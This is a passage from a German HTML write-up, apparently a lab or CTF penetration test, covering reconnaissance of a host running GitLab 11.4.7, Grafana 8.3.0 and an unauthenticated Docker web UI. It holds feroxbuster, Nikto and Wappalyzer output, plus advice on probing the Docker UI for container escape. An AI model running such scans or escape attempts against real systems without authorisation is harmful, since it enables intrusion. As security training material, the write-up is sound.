+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">feroxbuster --url "http://192.168.2.215:5080" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+ <span class="command">___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+───────────────────────────┬──────────────────────
+ 🎯  <span class="command">Target Url            │ http://192.168.2.215:5080</span>
+ 🚀  <span class="command">Threads               │ 50</span>
+ 📖  <span class="command">Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
+ 👌  <span class="command">Status Codes          │ [200, 301, 302]</span>
+ 💥  <span class="command">Timeout (secs)        │ 7</span>
+ 🦡  <span class="command">User-Agent            │ feroxbuster/2.11.0</span>
+ 💉  <span class="command">Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+ 🔎  <span class="command">Extract Links         │ true</span>
+ 💲  <span class="command">Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+ 🏁  <span class="command">HTTP methods          │ [GET]</span>
+ 🔃  <span class="command">Recursion Depth       │ 4</span>
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+....
+...
+<span class="command">200      GET       72l      207w     2095c http://192.168.2.215:5080/robots.txt</span>
+<span class="command">200      GET        2l      318w    16392c http://192.168.2.215:5080/assets/webpack/pages.users.620d5164.chunk.js</span>
+<span class="command">200      GET        2l     1184w    61099c http://192.168.2.215:5080/assets/webpack/commons~pages.groups.show~pages.projects.environments.metrics~pages.projects.graphs.show~pages.users.7ba1fbfd.chunk.js</span>
+<span class="command">200      GET        1l        5w      245c http://192.168.2.215:5080/users/root/snippets.json</span>
+<span class="command">200      GET        1l        4w       88c http://192.168.2.215:5080/users/root/groups.json</span>
+<span class="command">200      GET        7l       18w      381c http://192.168.2.215:5080/root.atom</span>
+<span class="command">200      GET      299l      936w    15535c http://192.168.2.215:5080/users/root/groups</span>
+<span class="command">200      GET        1l        5w      169c http://192.168.2.215:5080/users/root/projects.json</span>
+<span class="command">301      GET        1l        5w       96c http://192.168.2.215:5080/users/root/ --&gt; http://192.168.2.215:5080/root</span>
+<span class="command">200      GET      300l      942w    15606c http://192.168.2.215:5080/users/root/snippets</span>
+<span class="command">200      GET      299l      936w    15539c http://192.168.2.215:5080/users/root/activity</span>
+<span class="command">200      GET        1l        1w        2c http://192.168.2.215:5080/users/root/calendar.json</span>
+<span class="command">200      GET        6l       14w      118c http://192.168.2.215:5080/users/root/calendar_activities</span>
+<span class="command">200      GET      299l      936w    15520c http://192.168.2.215:5080/root</span>
+<span class="command">200      GET      299l      936w    15545c http://192.168.2.215:5080/users/root/contributed</span>
+<span class="command">200      GET        1l        5w      159c http://192.168.2.215:5080/users/root/contributed.json</span>
+<span class="command">200      GET      299l      936w    15539c http://192.168.2.215:5080/users/root/projects</span>
+<span class="command">200      GET      244l      777w    13120c http://192.168.2.215:5080/explore.html</span>
+<span class="command">200      GET       94l      192w     2936c http://192.168.2.215:5080/422.html</span>
+<span class="command">200      GET       93l      186w     2930c http://192.168.2.215:5080/503.html</span>
+....
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich setze Feroxbuster auch auf dem Grafana-Dienst auf Port 3000 ein, um dort Verzeichnisse und Dateien zu finden, die über die Standard-Login-Seite hinausgehen. Die Optionen sind ähnlich wie beim Scan auf Port 5080.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Feroxbuster fand einige relevante Pfade auf Port 3000, darunter `/login` und `/signup` (was zur Identifizierung als Grafana passt) und verschiedene Pfade unter `/public/build/`, die auf JavaScript-Dateien für das Frontend hindeuten. Interessanter sind Pfade wie `/public` und `/reports` (die weiterleiten) sowie `/public/img`. Dies gibt mir einen Einblick in die Struktur des Grafana-Webservers.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie die gefundenen Pfade manuell oder mit spezialisierten Grafana-Tools, falls verfügbar. Achten Sie auf öffentlich zugängliche Dateien oder APIs unter `/public/`.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle öffentlich zugänglichen Verzeichnisse sicher konfiguriert sind und keine sensiblen Dateien enthalten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">feroxbuster --url "http://192.168.2.215:3000" --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt -x txt,php,rar....s.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+ <span class="command">___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+───────────────────────────┬──────────────────────
+ 🎯  <span class="command">Target Url            │ http://192.168.2.215:3000</span>
+ 🚀  <span class="command">Threads               │ 50</span>
+ 📖  <span class="command">Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
+ 👌  <span class="command">Status Codes          │ [200, 301, 302]</span>
+ 💥  <span class="command">Timeout (secs)        │ 7</span>
+ 🦡  <span class="command">User-Agent            │ feroxbuster/2.11.0</span>
+ 💉  <span class="command">Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+ 🔎  <span class="command">Extract Links         │ true</span>
+ 💲  <span class="command">Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+ 🏁  <span class="command">HTTP methods          │ [GET]</span>
+ 🔃  <span class="command">Recursion Depth       │ 4</span>
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+...
+<span class="command">200      GET        2l     1581w    80548c http://192.168.2.215:3000/public/build/6278.7bf7079e5ffd2b9b4bd3.js</span>
+<span class="command">200      GET        3l     3799w   185627c http://192.168.2.215:3000/public/build/3144.7bf7079e5ffd2b9b4bd3.js</span>
+<span class="command">200      GET        3l    55711w  3378979c http://192.168.2.215:3000/public/build/633.7bf7079e5ffd2b9b4bd3.js</span>
+<span class="command">200      GET      192l      704w    27909c http://192.168.2.215:3000/login</span>
+<span class="command">200      GET      192l      704w    27860c http://192.168.2.215:3000/signup</span>
+<span class="command">302      GET        2l        2w       31c http://192.168.2.215:3000/public --&gt; http://192.168.2.215:3000/public/</span>
+<span class="command">302      GET        2l        2w       24c http://192.168.2.215:3000/reports --&gt; http://192.168.2.215:3000/</span>
+<span class="command">302      GET        2l        2w       35c http://192.168.2.215:3000/public/img --&gt; http://192.168.2.215:3000/public/img/</span>
+...
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich führe auch einen Feroxbuster-Scan auf dem Dienst auf Port 9000 durch, der als "Golang net/http server" und "containers | docker web-ui" identifiziert wurde. Ich verwende die gleichen Optionen wie zuvor.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Scan auf Port 9000 fand verschiedene Pfade, insbesondere unter `/assets/`, die auf statische Dateien (CSS, JS, Bilder) einer Web-Oberfläche hindeuten. Interessant ist der Fund von `/version`, `/assets/js/min/clients/index.js`, `/assets/js/min/containers/statistics.js` und Pfaden mit Weiterleitungen (`301`) wie `/assets/css` -> `css/`. Dies bestätigt das Vorhandensein einer Web-Oberfläche und gibt Einblick in deren Dateistruktur. Die Endpunkte unter `/assets/js/min/...` deuten auf clientseitigen Code hin.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie die gefundene Web-Oberfläche auf Port 9000 manuell. Prüfen Sie den Source Code der clientseitigen Skripte (`.js`) auf Hinweise zur Funktionalität oder versteckte Endpunkte.
+                <br>**Empfehlung (Admin):** Überprüfen Sie, ob die Web-Oberfläche auf Port 9000 eine Authentifizierung erfordert und ob sensible Informationen oder Funktionen ungeschützt zugänglich sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">feroxbuster --url "http://192.168.2.215:9000" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+ <span class="command">___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+───────────────────────────┬──────────────────────
+ 🎯  <span class="command">Target Url            │ http://192.168.2.215:9000</span>
+ 🚀  <span class="command">Threads               │ 50</span>
+ 📖  <span class="command">Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
+ 👌  <span class="command">Status Codes          │ [200, 301, 302]</span>
+ 💥  <span class="command">Timeout (secs)        │ 7</span>
+ 🦡  <span class="command">User-Agent            │ feroxbuster/2.11.0</span>
+ 💉  <span class="command">Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+ 🔎  <span class="command">Extract Links         │ true</span>
+ 💲  <span class="command">Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+ 🏁  <span class="command">HTTP methods          │ [GET]</span>
+ 🔃  <span class="command">Recursion Depth       │ 4</span>
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+....
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/index.html --&gt; ./</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/index.html --&gt; ./</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/lib/index.html --&gt; ./</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/img/index.html --&gt; ./</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/app/index.html --&gt; ./</span>
+<span class="command">200      GET        5l        8w      113c http://192.168.2.215:9000/assets/js/min/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/min/index.html --&gt; ./</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/index.html --&gt; ./</span>
+<span class="command">200      GET        0l        0w        0c http://192.168.2.215:9000/version</span>
+<span class="command">301      GET        2l        3w       43c http://192.168.2.215:9000/assets --&gt; http://192.168.2.215:9000/assets/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css --&gt; css/</span>
+<span class="command">200      GET        1l       63w     4658c http://192.168.2.215:9000/assets/js/min/clients/index.js</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/min/clients --&gt; clients/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/lib --&gt; lib/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/lib --&gt; lib/</span>
+<span class="command">200      GET        1l      125w     9939c http://192.168.2.215:9000/assets/js/min/containers/statistics.js</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/app --&gt; app/</span>
+...
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich navigiere im Browser zur Web-Oberfläche auf Port 9000. Das Bild zeigt die Hauptansicht, die eine Liste von Docker-Containern darstellt. Die Überschrift "containers | docker web-ui" bestätigt meine Vermutung. Die Liste zeigt 4 laufende Container mit ihren Namen, IDs, Kommandos, Port-Mappings und verwendeten Images: `boring_tharp` (Python Debug Server, Port 8080, Image `whalesalad/docker-debug`), `gitlab-docker_web_1` (GitLab, Ports 5022, 50443, 5080, Image `gitlab/gitlab-ce:11.4.7-ce.0`), `grafana` (Grafana, Port 3000, Image `grafana/grafana-enterprise:8.3.0-ubuntu`), und `peaceful_jennings` (Docker WebUI selbst, Port 9000, Image `pottava/docker-webui`). Dies ist eine sehr detaillierte Übersicht der Container-Architektur des Zielsystems.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser Fund ist extrem wertvoll! Er erklärt die Vielzahl der offenen Ports – jeder Dienst läuft in einem separaten Docker-Container. Ich kenne nun die genauen Images und Versionen der Container, was für die Suche nach Container-spezifischen Schwachstellen oder Escape-Vektoren nützlich ist. Ich sehe die interne Struktur und die Beziehungen zwischen den Diensten. Die GitLab-Version (11.4.7) und die Grafana-Version (8.3.0-ubuntu) werden hier bestätigt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Analysieren Sie die gelisteten Container und ihre Images auf bekannte Schwachstellen. Untersuchen Sie die Docker Web-UI auf Port 9000 auf ungesicherte Funktionen, die die Interaktion mit Docker ermöglichen (z.B. Ausführen von Befehlen in Containern, Starten neuer Container).
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Management-Oberflächen wie die Docker Web-UI (falls überhaupt notwendig) nicht öffentlich zugänglich sind und eine starke Authentifizierung erfordern. Überprüfen Sie die Images auf veraltete Software.
+            </p>
+            <p>
+                Analyse der Docker Web-UI auf Port 9000:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:9000/</span>
+<span class="command">docker web-ui</span>
+
+    <span class="command">containers</span>
+    <span class="command">logs</span>
+    <span class="command">stats</span>
+    |
+    <span class="command">images</span>
+    |
+    <span class="command">clients</span>
+
+<span class="command">4 containers</span>
+<span class="command">ID	Names	Command	Ports	Repository &amp; Tags	Status</span>
+<span class="command">3573	</span>
+
+    <span class="command">boring_tharp</span>
+
+	<span class="command">python /app/a..	0.0.0.0:8080-&gt;8080/tcp	whalesalad/docker-debug	Up an hour</span>
+<span class="command">12e8	</span>
+
+    <span class="command">gitlab-docker_web_1</span>
+
+	<span class="command">/assets/wrapp..	0.0.0.0:5022-&gt;22/tcp,0.0.0.0:50443-&gt;443/tcp,0.0.0.0:5080-&gt;80/tcp	gitlab/gitlab-ce:11.4.7-ce.0	Up an hour (healthy)</span>
+<span class="command">c2f5	</span>
+
+    <span class="command">grafana</span>
+
+	<span class="command">/run.sh	0.0.0.0:3000-&gt;3000/tcp	grafana/grafana-enterprise:8.3.0-ubuntu	Up an hour</span>
+<span class="command">4001	</span>
+
+    <span class="command">peaceful_jennings</span>
+
+	<span class="command">docker-webui ..	0.0.0.0:9000-&gt;9000/tcp	pottava/docker-webui	Up an hour</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich habe die Details eines spezifischen Docker-Images abgerufen, wahrscheinlich über die Docker Web-UI auf Port 9000 oder durch manuelle Analyse. Das Listing zeigt Metadaten zum Image `ubuntu:18.04`, einschließlich seiner ID, Erstellungsdatum, Konfiguration (Hostname, PATH, CMD) und RootFS-Layer.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Möglichkeit, Image-Details abzurufen, bestätigt eine gewisse Interaktion mit der Docker-Engine über die Web-UI (oder eine andere Methode). Das Wissen um das `ubuntu:18.04` Image ist nützlich, da es als Basis für Container-Ausbrüche oder zur Ausführung von Befehlen in neuen Containern verwendet werden kann, falls die Docker-API oder die UI-Funktionalität dies zulässt. Die Image-ID `sha256:71cb16d32be4a95065b4fa1c8841a6f4c0098de7be0a90e14519098412d48356` ist die eindeutige Referenz.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie die gefundene Image-ID, um das Image ggf. selbst herunterzuladen und offline zu analysieren. Testen Sie, ob Sie neue Container basierend auf diesem oder anderen Images starten können, eventuell mit gemountetem Host-Dateisystem.
+                <br>**Empfehlung (Admin):** Beschränken Sie den Zugriff auf die Docker-API und Management-Oberflächen streng. Überprüfen Sie die Images auf sensible Konfigurationen oder Dateien, die beim Bauen unbeabsichtigt hinzugefügt wurden.
+            </p>
+             <pre>
+<span class="command">ubuntu:18.04</span>
+{
+ <span class="command">"Id": "sha256:71cb16d32be4a95065b4fa1c8841a6f4c0098de7be0a90e14519098412d48356"</span>,
+ <span class="command">"RepoTags": [</span>
+  <span class="command">"ubuntu:18.04"</span>
+ ],
+ <span class="command">"Created": "2022-10-04T23:35:04.927324933Z"</span>,
+ <span class="command">"Container": "35c51f413ad633f9fac7490dfcbd26f5487c87206fd611be09c868d04cebc1b9"</span>,
+ <span class="command">"ContainerConfig": {</span>
+  <span class="command">"Hostname": "35c51f413ad6"</span>,
+  <span class="command">"Env": [</span>
+   <span class="command">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
+  ],
+  <span class="command">"Cmd": [</span>
+   <span class="command">"/bin/sh"</span>,
+   <span class="command">"-c"</span>,
+   <span class="command">"#(nop) "</span>,
+   <span class="command">"CMD [\"bash\"]"</span>
+  ],
+  <span class="command">"Image": "sha256:768c80f47ccbda97534fb527ed3082a6b1a6330b5213d0de6c2059ad8322a98b"</span>,
+  <span class="command">"Entrypoint": null</span>
+ },
+ <span class="command">"DockerVersion": "20.10.12"</span>,
+ <span class="command">"Config": {</span>
+  <span class="command">"Env": [</span>
+   <span class="command">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
+  ],
+  <span class="command">"Cmd": [</span>
+   <span class="command">"bash"</span>
+  ],
+  <span class="command">"Image": "sha256:768c80f47ccbda97534fb527ed3082a6b1a6330b5213d0de6c2059ad8322a98b"</span>,
+  <span class="command">"Entrypoint": null</span>
+ },
+ <span class="command">"Architecture": "amd64"</span>,
+ <span class="command">"Size": 63146043</span>,
+ <span class="command">"VirtualSize": 63146043</span>,
+ <span class="command">"RepoDigests": [</span>
+  <span class="command">"ubuntu@sha256:40b84b75884ff39e4cac4bf62cb9678227b1fbf9dbe3f67ef2a6b073aa4bb529"</span>
+ ],
+ <span class="command">"RootFS": {</span>
+  <span class="command">"Type": "layers"</span>,
+  <span class="command">"Layers": [</span>
+   <span class="command">"sha256:b9b23e6545749dab77233e9c3ce2237e6705cbd30de01e11f529b0e49c155cd5"</span>
+  ]
+ },
+ <span class="command">"Os": "linux"</span>
+}
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich habe Wappalyzer, eine Browser-Erweiterung zur Identifizierung von Technologien auf Webseiten, auf den Webdiensten ausgeführt und dokumentiere die Ergebnisse. Dies gibt mir einen Überblick über die verwendeten Frameworks, Bibliotheken und Sprachen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Wappalyzer bestätigte das Vorhandensein von Grafana und GitLab sowie Technologien wie React, Vue.js, Ruby on Rails (wahrscheinlich für GitLab), Webpack, jQuery, Bootstrap. Dies ist eine nützliche Ergänzung zu den Nmap- und Feroxbuster-Ergebnissen und bestätigt die Komplexität der Web-Umgebung. Das Wissen um die spezifischen Versionen von Bibliotheken (z.B. jQuery 1.12.4, Bootstrap 4.1.1) kann für die Suche nach clientseitigen Schwachstellen relevant sein.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verwenden Sie Tools wie Wappalyzer, um schnell die eingesetzten Technologien zu identifizieren. Dies hilft bei der Fokussierung der Recherche auf bekannte Schwachstellen in diesen spezifischen Versionen.
+                <br>**Empfehlung (Admin):** Führen Sie regelmäßige Audits der eingesetzten Web-Technologien durch und halten Sie Frameworks und Bibliotheken aktuell, um bekannte Schwachstellen zu vermeiden. Minimieren Sie die Information über verwendete Versionen in Headern oder Metadaten.
+            </p>
+            <pre>
+<span class="command">Wappalyzer:</span>
+<span class="command">----------------------------------</span>
+
+<span class="command">JavaScript Frameworks</span>
+<span class="command">React 15.6.1</span>
+<span class="command">Vue.js</span>
+
+<span class="command">Ticketsysteme</span>
+<span class="command">GitLab</span>
+
+<span class="command">Web Frameworks</span>
+<span class="command">Ruby on Rails 50% sure</span>
+
+<span class="command">Sonstiges</span>
+<span class="command">Webpack</span>
+<span class="command">Open Graph</span>
+
+<span class="command">Programmiersprache</span>
+<span class="command">Ruby 50% sure</span>
+
+<span class="command">Entwicklungswerkzeuge</span>
+<span class="command">GitLab</span>
+
+<span class="command">JavaScript Bibliotheken</span>
+<span class="command">core-js 2.5.7</span>
+<span class="command">jQuery 1.12.4</span>
+<span class="command">Select2</span>
+
+<span class="command">UI Frameworks</span>
+<span class="command">Bootstrap 4.1.1</span>
+</pre>
+
+        </section>
+```
+
+**Teil 2 von 3**
+
+```html
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                **Analyse:** Ich führe Nikto-Scans auf den neu entdeckten HTTP-Diensten durch, beginnend mit Grafana auf Port 3000.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Nikto-Scan auf Port 3000 bestätigt, dass es sich um Grafana handelt. Er meldet eine Weiterleitung von `/` auf `/login` und findet den `/robots.txt` Eintrag, der `Disallow: /` enthält. Es werden keine kritischen Webserver-Schwachstellen berichtet, abgesehen vom fehlenden `X-Content-Type-Options` Header. Die relevante Information ist die Bestätigung, dass `/login/` existiert, was zum Anmelden einlädt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Der Fokus liegt weiterhin auf der Login-Funktionalität. Suchen Sie nach Standard-Anmeldedaten oder Schwachstellen, die eine Umgehung der Authentifizierung ermöglichen.
+                <br>**Empfehlung (Admin):** Implementieren Sie Sicherheits-Header. Überprüfen Sie die Grafana-Konfiguration auf ungesicherte Endpunkte oder Standard-Anmeldedaten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nikto -h http://192.168.2.215:3000</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.215</span>
+<span class="command">+ Target Hostname:    192.168.2.215</span>
+<span class="command">+ Target Port:        3000</span>
+<span class="password">+ Start Time:         2025-06-06 23:13:25 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: No banner retrieved</span>
+<span class="command">+ Root page / redirects to: /login</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+<span class="password">+ /robots.txt: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="password">+ /login/: This might be interesting.</span>
+<span class="password">+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-06 23:14:04 (GMT2) (39 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="password">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich führe einen Nikto-Scan auf dem Docker Web UI auf Port 9000 durch.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Scan auf Port 9000 meldet fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`) und dass der Server mit ungültigen HTTP-Methoden gültig antwortet, was auf eine ungewöhnliche Implementierung hindeutet. Es werden keine spezifischen kritischen Schwachstellen gemeldet, die direkt ausnutzbar wären. Der Dienst hat keine Login-Seite im klassischen Sinne, wie aus der Nmap-Ausgabe hervorging ("containers | docker web-ui" im Titel), was bedeutet, er könnte ungeschützt sein.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie die Funktionalität der Docker Web UI auf Port 9000 auf unauthentifizierten Zugriff und die Möglichkeit, mit Containern oder Images zu interagieren. Dies scheint eine potenzielle Angriffsfläche zu sein, da kein Login erforderlich zu sein scheint.
+                <br>**Empfehlung (Admin):** Sichern Sie den Zugriff auf Management-Schnittstellen wie diese Docker Web UI. Standardmäßig sollten sie nicht öffentlich zugänglich sein.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nikto -h http://192.168.2.215:9000</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.215</span>
+<span class="command">+ Target Hostname:    192.168.2.215</span>
+<span class="command">+ Target Port:        9000</span>
+<span class="password">+ Start Time:         2025-06-06 23:14:28 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: No banner retrieved</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+<span class="password">+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.</span>
+<span class="password">+ 8104 requests: 0 error(s) and 3 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-06 23:14:57 (GMT2) (29 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="password">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich führe einen Nikto-Scan auf der GitLab-Instanz auf Port 5080 durch.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Nikto-Scan auf Port 5080 identifiziert einige interessante Punkte auf der Nginx-Basis. Es werden fehlende Sicherheits-Header bemängelt. Es findet Endpunkte wie `/help/`, `/public/`, `/search.vts` und `/help.php`, die für einen Angreifer von Interesse sein könnten. Die Einträge in `robots.txt` werden ebenfalls als potenziell interessant hervorgehoben. Die Header `x-runtime` und `x-request-id` sind anwendungsspezifische Header von GitLab. Der kritischste Punkt bleibt die GitLab-Version 11.4.7 selbst.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Konzentrieren Sie sich auf bekannte Schwachstellen in GitLab 11.4.7. Die gefundenen Endpunkte (z.B. `/help/`, `/public/`) sollten weiter untersucht werden, insbesondere nach LFI/RFI oder anderen Schwachstellen, die ohne Authentifizierung ausgenutzt werden können.
+                <br>**Empfehlung (Admin):** Aktualisieren Sie GitLab umgehend. Überprüfen Sie die Konfiguration von Nginx und GitLab auf ungesicherte Endpunkte oder Informationslecks. Implementieren Sie Sicherheits-Header.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nikto -h http://192.168.2.215:5080</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.215</span>
+<span class="command">+ Target Hostname:    192.168.2.215</span>
+<span class="command">+ Target Port:        5080</span>
+<span class="password">+ Start Time:         2025-06-06 23:15:55 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: nginx</span>
+<span class="command">+ /: Uncommon header 'x-runtime' found, with contents: 0.012865.</span>
+<span class="command">+ /: Uncommon header 'x-request-id' found, with contents: b866f93b-28f1-4044-9896-b635a8a2f5ba.</span>
+<span class="command">+ Root page / redirects to: [Link: http://192.168.2.215/users/sign_in | Ziel: http://192.168.2.215/users/sign_in]</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+<span class="password">+ /robots.txt: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="password">+ /robots.txt: Entry '/users/sign_in/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
+<span class="password">+ /robots.txt: Entry '/search/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
